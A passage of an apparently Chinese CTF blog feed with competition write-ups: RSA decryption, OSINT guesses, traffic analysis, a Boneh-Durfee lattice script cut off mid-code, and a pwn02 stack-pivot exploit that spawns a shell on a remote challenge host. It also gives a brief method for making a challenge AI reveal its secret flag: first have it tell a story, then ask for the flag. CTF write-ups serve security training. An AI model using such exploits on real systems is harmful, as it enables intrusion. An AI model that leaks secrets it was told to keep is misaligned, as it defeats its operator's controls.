(73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819, 65537)</span><br><span class=\"line\">c2 = 30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span><br><span class=\"line\"></span><br><span class=\"line\">d = gmpy2.invert(65537, (p-1)*(q-1))</span><br><span class=\"line\">m = pow(c2,d,n)</span><br><span class=\"line\">flag2 = long_to_bytes(m)</span><br><span class=\"line\">print(q*p)</span><br><span class=\"line\">print(flag2)</span><br><span class=\"line\"># b&#x27;s0lve_the_@pb&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">p = 9067773077510925207378520309595658022345214442920360440202890774224295250116442048990578009377300541280465330975931465993745130297479191298485033569345231</span><br><span class=\"line\">q = 8112940945910485817171807897687451701452029959677470272197529542411816926233172848066074195817612280582244564398252967013953964546888998662975298338523549</span><br><span class=\"line\">c3 = 17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755</span><br><span class=\"line\"></span><br><span class=\"line\">n3,e3 = (94789409892878223843496496113047481402435455468813255092840207010463661854593919772268992045955100688692872116996741724352837555794276141314552518390800907711192442516993891316013640874154318671978150702691578926912235318405120588096104222702992868492960182477857526176600665556671704106974346372234964363581, 65537)</span><br><span class=\"line\">c3 = 17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755</span><br><span class=\"line\">m3 = pow(c3,d,n)</span><br><span class=\"line\">flag3= long_to_bytes(m3)</span><br><span class=\"line\">print(flag3)</span><br><span class=\"line\"># b&#x27;q_prob1em!!&#125;&#x27;</span><br></pre></td></tr></table></figure>\n<h1 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> Misc：</h1>\n<h2 id=\"givemesecret\"><a class=\"markdownIt-Anchor\" href=\"#givemesecret\">#</a> givemesecret：</h2>\n<p>​\t\tai 题，虽然不懂原理，但队友出了，他的方法是先让 ai 编一个故事，是否和 flag 有关我没问他，之后让 ai 显示 flag 即可</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/2188fc8e167d4abc8b142f462c81ff30.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"master-of-osint\"><a class=\"markdownIt-Anchor\" href=\"#master-of-osint\">#</a> Master of OSINT：</h2>\n<p>1. 远处有海，有山，有草，空旷，北方，环海或者环湖公路，青海湖，根据位置去找</p>\n<p>2. 百安居去找</p>\n<p>3. 四川省机场集团航空地面服务有限公司</p>\n<p>4.IKEA 宜家家居附近</p>\n<p>5. 重庆</p>\n<p>6.H 形大厦</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/a7a84a502b8243e7b5064e67ea497ef4.jpeg#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>7. 左侧是船，右侧觉华塔，橘子洲游客中心位置</p>\n<p>8. 一个跨海大桥，右侧车道 “长江”</p>\n<p>9. 武汉天兴洲长江大桥中间</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/a7aeeaf030df4557ae759a32c4def541.jpeg#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>10. 宏泰百货，然后杭州和深圳都试试，确定为杭州</p>\n<h2 id=\"签到\"><a class=\"markdownIt-Anchor\" href=\"#签到\">#</a> 签到：</h2>\n<p>​\t\tflag 再内容里，直接交。</p>\n<h2 id=\"问卷调查\"><a class=\"markdownIt-Anchor\" href=\"#问卷调查\">#</a> 问卷调查：</h2>\n<p>​\t\t填写问卷就有 flag。</p>\n",
            "tags": [
                "Game"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/c2860616.html",
            "url": "http://blog.g01den.top/posts/c2860616.html",
            "title": "网鼎杯2024青龙组官方资格赛wp",
            "date_published": "2024-10-31T11:24:37.000Z",
            "content_html": "<h1 id=\"pwn02\"><a class=\"markdownIt-Anchor\" href=\"#pwn02\">#</a> pwn02:</h1>\n<p>** 第一步：**checksec 发现 32 位架构，开了 NX 和 ASLR。</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/e15f7f729e9047e280f849d9038d0ef1.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>** 第二步：**login 函数有个登陆，账号密码都在里面</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/aceb7788569e4b7eba0de8d9a96b1d89.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>** 第三步：**vuln 函数存在栈溢出，但是只能溢出 8 个字节，确定位栈迁移。</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/0017c348f35141c0b98d0ca1a3382fce.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>** 第四步：** 编写脚本，攻击：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./short&quot;</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./short&quot;</span>)</span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;0192d5e6064e782f81f9a9fbc9fc041d.0ke5.dg05.ciihw.cn&quot;</span>,<span class=\"number\">45818</span>)</span><br><span class=\"line\"><span class=\"comment\"># io.recvuntil(b&quot;Enter your username: &quot;)</span></span><br><span class=\"line\">io.recv()</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;admin&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># io.recvuntil(b&quot;Enter your password: &quot;)</span></span><br><span class=\"line\">io.recv()</span><br><span class=\"line\">io.sendline(<span class=\"string\">&quot;admin123&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;You will input this: &quot;</span>)</span><br><span class=\"line\">add = io.recv(<span class=\"number\">10</span>) </span><br><span class=\"line\"><span class=\"comment\"># print(int(add,16))</span></span><br><span class=\"line\">addr = <span class=\"built_in\">int</span>(add,<span class=\"number\">16</span>)</span><br><span class=\"line\">log.success(<span class=\"built_in\">hex</span>(addr))</span><br><span class=\"line\"></span><br><span class=\"line\">ret = <span class=\"number\">0x080483fa</span></span><br><span class=\"line\">system_addr = elf.plt[<span class=\"string\">&quot;system&quot;</span>]</span><br><span class=\"line\">binsh = <span class=\"number\">0x804A038</span></span><br><span class=\"line\">vuln_addr = elf.symbols[<span class=\"string\">&quot;vuln&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(ret) + p32(system_addr) + p32(ret) + p32(binsh) + p32(binsh)</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">80</span>,<span class=\"string\">b&quot;p&quot;</span>) </span><br><span class=\"line\">payload = payload + p32(addr) + p32(<span class=\"number\">0x08048674</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/81c4aa9d525f4c158218615d13caf5ce.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"misc03\"><a class=\"markdownIt-Anchor\" href=\"#misc03\">#</a> misc03：</h1>\n<p>** 第一步：** 打开流量包，根据协议排序发现了两种有用的协议，一个 TCP，一个 HTTP，察觉可能是个网站，然后过滤 HTTP：</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/935450027d77434ea760ad654e2da17a.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>** 第二步：** 过滤 HTTP 后发现了个疑似危险 ip：39.144.218.183，有爆破目录的可能：</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/524d347f90dd4aa4a123c2b543563c9c.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>** 第三步：** 根据很多请求响应对，发现很多都是 404，404 的状态长度比较短，根据 Length 排序，从最大的和最小的开始选，找出与众不同的一批流量，发现了木马和访问木马的 ip：</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/9ccd78a6d5c34c029ee82a85965bedb1.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>** 第四步：** 跟踪这个流，发现了危险的 payload，确定这个就是攻击者：<br>\n<img data-src=\"https://i-blog.csdnimg.cn/direct/6da17fb87b4d4daebf6d6a8a81a7fe50.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wdflag&#123;39.168.5.60&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"crypto01\"><a class=\"markdownIt-Anchor\" href=\"#crypto01\">#</a> crypto01：</h1>\n<p>​\t\t原题，直接上 https://www.cnblogs.com/mumuhhh/p/17789591.html，有个脚本，改一下，具体参数之后直接 sagemath 跑：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\">time.clock = time.time</span><br><span class=\"line\"> </span><br><span class=\"line\">debug = <span class=\"literal\">True</span></span><br><span class=\"line\"> </span><br><span class=\"line\">strict = <span class=\"literal\">False</span></span><br><span class=\"line\"> </span><br><span class=\"line\">helpful_only = <span class=\"literal\">True</span></span><br><span class=\"line\">dimension_min = <span class=\"number\">7</span> <span class=\"comment\"># 如果晶格达到该尺寸，则停止移除</span></span><br><span class=\"line\"><span class=\"comment\"># 显示有用矢量的统计数据</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">helpful_vectors</span>(<span class=\"params\">BB, modulus</span>):</span><br><span class=\"line\">    nothelpful = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ii <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(BB.dimensions()[<span class=\"number\">0</span>]):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class=\"line\">            nothelpful += <span class=\"number\">1</span></span><br><span class=\"line\">            </span><br><span class=\"line\">    <span class=\"built_in\">print</span> (nothelpful, <span class=\"string\">&quot;/&quot;</span>, BB.dimensions()[<span class=\"number\">0</span>], <span class=\"string\">&quot; vectors are not helpful&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 显示带有 0 和 X 的矩阵</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">matrix_overview</span>(<span class=\"params\">BB, bound</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ii <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(BB.dimensions()[<span class=\"number\">0</span>]):</span><br><span class=\"line\">        a = (<span class=\"string\">&#x27;%02d &#x27;</span> % ii)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> jj <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(BB.dimensions()[<span class=\"number\">1</span>]):</span><br><span class=\"line\">            a += <span class=\"string\">&#x27;0&#x27;</span> <span class=\"keyword\">if</span> BB[ii,jj] == <span class=\"number\">0</span> <span class=\"keyword\">else</span> <span class=\"string\">&#x27;X&#x27;</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> BB.dimensions()[<span class=\"number\">0</span>] &lt; <span class=\"number\">60</span>: </span><br><span class=\"line\">                a += <span class=\"string\">&#x27; &#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> BB[ii, ii] &gt;= bound:</span><br><span class=\"line\">            a += <span class=\"string\">&#x27;~&#x27;</span></span><br><span class=\"line\">        <span class=\"comment\">#print (a)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 尝试删除无用的向量</span></span><br><span class=\"line\"><span class=\"comment\"># 从当前 = n-1（最后一个向量）开始</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">remove_unhelpful</span>(<span class=\"params\">BB, monomials, bound, current</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 我们从当前 = n-1（最后一个向量）开始</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> current == -<span class=\"number\">1</span> <span class=\"keyword\">or</span> BB.dimensions()[<span class=\"number\">0</span>] &lt;= dimension_min:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> BB</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># 开始从后面检查</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> ii <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(current, -<span class=\"number\">1</span>, -<span class=\"number\">1</span>):</span><br><span class=\"line\">        <span class=\"comment\">#  如果它没有用</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> BB[ii, ii] &gt;= bound:</span><br><span class=\"line\">            affected_vectors = <span class=\"number\">0</span></span><br><span class=\"line\">            affected_vector_index = <span class=\"number\">0</span></span><br><span class=\"line\">             <span class=\"comment\"># 让我们检查它是否影响其他向量</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> jj <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(ii + <span class=\"number\">1</span>, BB.dimensions()[<span class=\"number\">0</span>]):</span><br><span class=\"line\">                <span class=\"comment\"># 如果另一个向量受到影响：</span></span><br><span class=\"line\">                <span class=\"comment\"># 我们增加计数</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> BB[jj, ii] != <span class=\"number\">0</span>:</span><br><span class=\"line\">                    affected_vectors += <span class=\"number\">1</span></span><br><span class=\"line\">                    affected_vector_index = jj</span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"comment\"># 等级：0</span></span><br><span class=\"line\">            <span class=\"comment\"># 如果没有其他载体最终受到影响</span></span><br><span class=\"line\">            <span class=\"comment\"># 我们删除它</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> affected_vectors == <span class=\"number\">0</span>:</span><br><span class=\"line\">                <span class=\"comment\">#print (&quot;* removing unhelpful vector&quot;, ii)</span></span><br><span class=\"line\">                BB = BB.delete_columns([ii])</span><br><span class=\"line\">                BB = BB.delete_rows([ii])</span><br><span class=\"line\">                monomials.pop(ii)</span><br><span class=\"line\">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class=\"number\">1</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> BB</span><br><span class=\"line\"> </span><br><span class=\"line\">           <span class=\"comment\"># 等级：1</span></span><br><span class=\"line\">            <span class=\"comment\">#如果只有一个受到影响，我们会检查</span></span><br><span class=\"line\">            <span class=\"comment\"># 如果它正在影响别的向量</span></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> affected_vectors == <span class=\"number\">1</span>:</span><br><span class=\"line\">                affected_deeper = <span class=\"literal\">True</span></span><br><span class=\"line\">                <span class=\"keyword\">for</span> kk <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(affected_vector_index + <span class=\"number\">1</span>, BB.dimensions()[<span class=\"number\">0</span>]):</span><br><span class=\"line\">                    <span class=\"comment\"># 如果它影响哪怕一个向量</span></span><br><span class=\"line\">                    <span class=\"comment\"># 我们放弃这个</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> BB[kk, affected_vector_index] != <span class=\"number\">0</span>:</span><br><span class=\"line\">                        affected_deeper = <span class=\"literal\">False</span></span><br><span class=\"line\">                <span class=\"comment\"># 如果没有其他向量受到影响，则将其删除，并且</span></span><br><span class=\"line\">                <span class=\"comment\"># 这个有用的向量不够有用</span></span><br><span class=\"line\">                <span class=\"comment\">#与我们无用的相比</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> affected_deeper <span class=\"keyword\">and</span> <span class=\"built_in\">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class=\"built_in\">abs</span>(bound - BB[ii, ii]):</span><br><span class=\"line\">                    <span class=\"comment\">#print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span></span><br><span class=\"line\">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class=\"line\">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class=\"line\">                    monomials.pop(affected_vector_index)</span><br><span class=\"line\">                    monomials.pop(ii)</span><br><span class=\"line\">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class=\"number\">1</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> BB</span><br><span class=\"line\">    <span class=\"comment\"># nothing happened</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> BB</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot; </span></span><br><span class=\"line\"><span class=\"string\">Returns:</span></span><br><span class=\"line\"><span class=\"string\">* 0,0   if it fails</span></span><br><span class=\"line\"><span class=\"string\">* -1，-1 如果 &quot;strict=true&quot;，并且行列式不受约束</span></span><br><span class=\"line\"><span class=\"string\">* x0,y0 the solutions of `pol`</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">boneh_durfee</span>(<span class=\"params\">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\"> 在以下情况下找到解决方案：</span></span><br><span class=\"line\"><span class=\"string\">* d &lt; N^delta</span></span><br><span class=\"line\"><span class=\"string\">* |x|&lt; e^delta</span></span><br><span class=\"line\"><span class=\"string\">* |y|&lt; e^0.5</span></span><br><span class=\"line\"><span class=\"string\">每当 delta &lt; 1 - sqrt（2）/2 ~ 0.292</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># substitution (Herrman and May)</span></span><br><span class=\"line\">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)   <span class=\"comment\">#多项式环</span></span><br><span class=\"line\">    Q = PR.quotient(x*y + <span class=\"number\">1</span> - u)        <span class=\"comment\">#  u = xy + 1</span></span><br><span class=\"line\">    polZ = Q(pol).lift()</span><br><span class=\"line\"> </span><br><span class=\"line\">    UU = XX*YY + <span class=\"number\">1</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># x-移位</span></span><br><span class=\"line\">    gg = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> kk <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(mm + <span class=\"number\">1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ii <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(mm - kk + <span class=\"number\">1</span>):</span><br><span class=\"line\">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class=\"line\">            gg.append(xshift)</span><br><span class=\"line\">    gg.sort()</span><br><span class=\"line\"> </span><br><span 